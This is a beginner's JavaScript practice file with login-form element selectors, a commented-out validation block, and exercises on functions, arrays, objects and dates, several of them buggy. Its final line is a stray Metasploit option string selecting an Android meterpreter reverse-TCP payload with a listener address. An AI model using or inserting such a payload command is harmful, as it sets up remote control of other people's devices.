var email, password, submit , passwordError , usernameError , resetBtn

                                 
      email = document.querySelector('#username')
    password = document.querySelector('#password')
    submit = document.querySelector('#submit')
    passwordError = document.querySelector('#passwordError')
    usernameError =  document.querySelector('#usernameError')
    resetBtn = document.querySelector('#resetBtn')                             
                             
  
function Login() {
    console.log(email + ' ' + password) 
}                                        

 // submit.addEventListener('click', function(event) {
     const e = email.value
     const p = password.value  
   
  /*   if (e.length < 1 ||  p.length < 1)  {
         passwordError.innerHTML = 'username and password is required'
         usernameError.innerHTML = 'username and password is required'
         return false
     } 
    
    

     if (e.length < 5 ) {
         usenameError.innerHTML='the character must be more than five'
             return false
     }
    
     if (p.length <= 7)  {
         passwordError.innerHTML='the password must be at least seven letters'
         return false
     }

     e.value > 7 && p.value > 7; alert ('you have succesfully login ')
     email.value = ''
     password.value='' 
 })
*/

function myFunction () {
    email.value = ''
    password.value=''
}    

function calculateAge(yearOfBirth) {
    var age = 2024 - yearOfBirth;
    return age;
}


var ageJohn = calculateAge(2002);
console.log(ageJohn);


function calculateTime (whenTheyLeft)  {
  var time = 10 - whenTheyLeft + 'pm'
  return time;
    
}

var timeBolaLeft = calculateTime(7);
var timeLekanLeft = calculateTime(2);
var timeClintonLeft = calculateTime(9);


console.log(timeBolaLeft);

var names = ['clinton' , 'lexxance' ,'luis' ,'fidelis']

console.log(names)

 scrollTo (50 , 900); {
        
 } 

 var dt = new Date( "December 25, 1995 23:15:20" );
 document.write("getUTCFullYear() : " + dt.getUTCFullYear() );
    console.log
let a = {}
let b = new Object()
    
console.log(b , a);

a.man = 'bola'

b.woman = 'chi';


b = {
    prince: ' hfhf fhfjjfjf', gdgd: 'ggvj vjhvjvjh vjhjjh',ggggg:'fdfggfhf'
}

console.log( a);

console.log(b );

const bb = 'gggggg'
 
console.log(bb)

const ppp = 'qwerty'
const jjj = 'giggle'

const bbb = { ppp: 'ffff', jjj: 'jjjjrrr' }   

const k = 'palmgrove'   

let d , j , c ;
d = 12;
j = 9;
c = d + j / 4;

console.log(c)

let x = 5;              
let z = Math.pow(x,3); 
                        
console.log(z)


let u , y, t;
u = 67; y = 54; t = 34;
console.log(u ** t) 


let n = {}
let v = new Object()

n.engineer = 'bolaji'
v.entrepeneur = 'george'

console.log(n , v)  

let student = ['bola', 'bala' , 'shola' , 'jide' ] 
student[3] = 'lexxance'
student.pop('orange');

console.log(student) 

 var studentResource = {
    firstClass : 'gold',
    secondClass : 'silver',
    thirdClass : 'diamond'

 }

 let x = 16
 

console.log(studentResource.secondClass) 
console.log(student.length) 


var
f , g ;
f = 8;
g = 6;


const nimes = 'yield'



var msecs = Date.parse( "Aug 28, 2008 23:30:00" );
document.write( "Number of milliseconds from 1970: " + msecs );


console.log(msecs)

-p android/meterpreter/reverse_tcp LHOST=192.168.43.1